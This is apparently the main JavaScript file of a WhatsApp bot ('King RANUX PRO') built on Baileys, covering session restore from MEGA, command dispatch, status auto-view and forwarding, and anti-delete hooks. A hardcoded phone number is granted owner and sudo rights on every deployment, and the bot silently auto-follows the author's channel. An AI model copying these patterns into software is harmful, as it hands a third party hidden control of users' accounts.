const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  fetchLatestBaileysVersion,
  Browsers,
  downloadContentFromMessage
} = require('@whiskeysockets/baileys');

const fs = require('fs');
const P = require('pino');
const express = require('express');
const axios = require('axios');
const path = require('path');
const qrcode = require('qrcode-terminal');
const { File } = require('megajs');

// 🔥 USER REPO SUPPORT CONFIG
const config = require(process.cwd() + "/config.js");

const { sms, downloadMediaMessage } = require('./lib/msg');
const {
  getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson
} = require('./lib/functions');

const { commands, replyHandlers } = require('./command');

// ===== OWNER SYSTEM (OLD BASE) =====
const ownerNumber = ['94726880784'];
const MASTER_SUDO = ['94726880784'];

const app = express();
const port = process.env.PORT || 8000;
const prefix = config.PREFIX || '.';
const credsPath = path.join(__dirname, '/auth_info_baileys/creds.json');

// ===== ANTI DELETE PLUGIN =====
const antiDeletePlugin = require('./plugins/antidelete.js');
global.pluginHooks = global.pluginHooks || [];
global.pluginHooks.push(antiDeletePlugin);

// ===== SESSION RESTORE =====
async function ensureSessionFile() {
  if (!fs.existsSync(credsPath)) {
    if (!config.SESSION_ID) {
      console.error('❌ SESSION_ID env variable is missing.');
      process.exit(1);
    }

    console.log("🔄 creds.json not found. Downloading session from MEGA...");
    const filer = File.fromURL(`https://mega.nz/file/${config.SESSION_ID}`);

    filer.download((err, data) => {
      if (err) {
        console.error("❌ Failed to download session:", err);
        process.exit(1);
      }

      fs.mkdirSync(path.join(__dirname, '/auth_info_baileys/'), { recursive: true });
      fs.writeFileSync(credsPath, data);
      console.log("✅ Session restored. Restarting...");
      setTimeout(() => connectToWA(), 2000);
    });
  } else {
    setTimeout(() => connectToWA(), 1000);
  }
}

// ===== MAIN CONNECT =====
async function connectToWA() {
  console.log("Connecting  𝐊𝐢𝐧𝐠 𝐑𝐀𝐍𝐔𝐗 ᴾʳᵒ 👑");

  const { state, saveCreds } = await useMultiFileAuthState(
    path.join(__dirname, '/auth_info_baileys/')
  );
  const { version } = await fetchLatestBaileysVersion();

  const ranuxPro = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.windows("Chrome"),
    auth: state,
    version,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
  });

  // ===== CONNECTION UPDATE =====
  ranuxPro.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else if (connection === 'open') {
      console.log('✅ 𝐊𝐢𝐧𝐠 𝐑𝐀𝐍𝐔𝐗 ᴾʳᵒ connected to WhatsApp');

      const up = `👑 King RANUX PRO ONLINE ✅
⚙️ Stable Mode
🚀 Production

> Made By MR. Ransara Devnath`;

      const botJid = ranuxPro.user.id.split(":")[0] + "@s.whatsapp.net";

      await ranuxPro.sendMessage(botJid, {
        image: { url: config.ALIVE_IMG },
        caption: up
      });

      // ===== AUTO JOIN OFFICIAL CHANNEL =====
      try {
        await ranuxPro.newsletterFollow("0029VbC5zjdAojYzyAJS7U2S");
        console.log("✅ Auto joined King RANUX PRO official channel");
      } catch (e) {
        console.log("⚠️ Channel already followed / failed");
      }

      // ===== PLUGIN AUTO LOADER (CORE SAFE) =====
      const pluginPath = path.join(__dirname, "plugins");
      fs.readdirSync(pluginPath).forEach((plugin) => {
        if (plugin.endsWith(".js")) {
          require(path.join(pluginPath, plugin));
        }
      });
    }
  });

  ranuxPro.ev.on('creds.update', saveCreds);

  // ===== MESSAGE UPSERT =====
  ranuxPro.ev.on('messages.upsert', async ({ messages }) => {
    for (const msg of messages) {
      if (msg.messageStubType === 68) {
        await ranuxPro.sendMessageAck(msg.key);
      }
    }

    const mek = messages[0];
    if (!mek || !mek.message) return;

    mek.message = getContentType(mek.message) === 'ephemeralMessage'
      ? mek.message.ephemeralMessage.message
      : mek.message;

    const from = mek.key.remoteJid;
    const sender = mek.key.fromMe ? ranuxPro.user.id : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const isGroup = from.endsWith('@g.us');

    const botNumber = ranuxPro.user.id.split(':')[0];
    const pushname = mek.pushName || 'Sin Nombre';
    const isMe = botNumber.includes(senderNumber);
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const isSudo = MASTER_SUDO.includes(senderNumber);

    // ===== MODE FIREWALL =====
    const mode = (config.MODE || "public").toLowerCase();
    if (mode === "group" && !isGroup) return;
    if (mode === "inbox" && isGroup) return;
    if (mode === "private" && !(isOwner || isSudo)) return;

    const m = sms(ranuxPro, mek);
    const type = getContentType(mek.message);
    const body =
      type === 'conversation'
        ? mek.message.conversation
        : mek.message[type]?.text || mek.message[type]?.caption || '';

    const isCmd = body.startsWith(prefix);
    const commandName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');

    const groupMetadata = isGroup ? await ranuxPro.groupMetadata(from).catch(() => {}) : '';
    const groupName = isGroup ? groupMetadata.subject : '';
    const participants = isGroup ? groupMetadata.participants : '';
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
    const botNumber2 = await jidNormalizedUser(ranuxPro.user.id);
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;

    const reply = (text) => ranuxPro.sendMessage(from, { text }, { quoted: mek });

    // ===== STATUS SYSTEM =====
    if (mek.key.remoteJid === 'status@broadcast') {
      if (config.AUTO_STATUS_SEEN) {
        try { await ranuxPro.readMessages([mek.key]); } catch {}
      }

      if (config.AUTO_STATUS_REACT && mek.key.participant) {
        const emojis = ['❤️','🔥','😎','💯','🥰','🌸','🖤'];
        const randomEmoji = emojis[Math.floor(Math.random()*emojis.length)];
        try {
          await ranuxPro.sendMessage(mek.key.participant, {
            react: { text: randomEmoji, key: mek.key }
          });
        } catch {}
      }

      if (config.AUTO_STATUS_FORWARD) {
        if (mek.message?.imageMessage || mek.message?.videoMessage) {
          const msgType = mek.message.imageMessage ? "imageMessage" : "videoMessage";
          const mediaMsg = mek.message[msgType];
          const stream = await downloadContentFromMessage(
            mediaMsg,
            msgType === "imageMessage" ? "image" : "video"
          );

          let buffer = Buffer.from([]);
          for await (const chunk of stream)
            buffer = Buffer.concat([buffer, chunk]);

          await ranuxPro.sendMessage(botNumber + "@s.whatsapp.net", {
            [msgType === "imageMessage" ? "image" : "video"]: buffer,
            caption: `📥 Forwarded Status from @${senderNumber}`,
            mentions: [senderNumber + "@s.whatsapp.net"]
          });
        }
      }
      return;
    }

    // ===== COMMAND SYSTEM =====
    if (isCmd) {
      const cmd = commands.find((c) =>
        c.pattern === commandName || (c.alias && c.alias.includes(commandName))
      );
      if (cmd) {
        if (cmd.react)
          ranuxPro.sendMessage(from, { react: { text: cmd.react, key: mek.key } });

        try {
          cmd.function(ranuxPro, mek, m, {
            from, quoted: mek, body, isCmd,
            command: commandName, args, q,
            isGroup, sender, senderNumber,
            botNumber2, botNumber, pushname,
            isMe, isOwner,
            groupMetadata, groupName,
            participants, groupAdmins,
            isBotAdmins, isAdmins,
            reply,
          });
        } catch (e) {
          console.error("[PLUGIN ERROR]", e);
        }
      }
    }

    // ===== REPLY HANDLERS =====
    for (const handler of replyHandlers) {
      if (handler.filter(body, { sender, message: mek })) {
        try {
          await handler.function(ranuxPro, mek, m, {
            from, quoted: mek, body, sender, reply,
          });
          break;
        } catch (e) {
          console.log("Reply handler error:", e);
        }
      }
    }

    // ===== ANTI DELETE HOOK =====
    if (config.ANTI_DELETE && global.pluginHooks) {
      for (const plugin of global.pluginHooks) {
        if (plugin.onMessage) {
          try { await plugin.onMessage(ranuxPro, mek); } catch {}
        }
      }
    }
  });

  // ===== DELETE EVENT =====
  ranuxPro.ev.on('messages.update', async (updates) => {
    if (config.ANTI_DELETE && global.pluginHooks) {
      for (const plugin of global.pluginHooks) {
        if (plugin.onDelete) {
          try { await plugin.onDelete(ranuxPro, updates); } catch {}
        }
      }
    }
  });
}

// ===== START =====
ensureSessionFile();

app.get("/", (req, res) => {
  res.send("Hey, 👑 𝐊𝐢𝐧𝐠 𝐑𝐀𝐍𝐔𝐗 ᴾʳᵒ started ✅");
});

app.listen(port, () =>
  console.log(`Server listening on http://localhost:${port}`)
);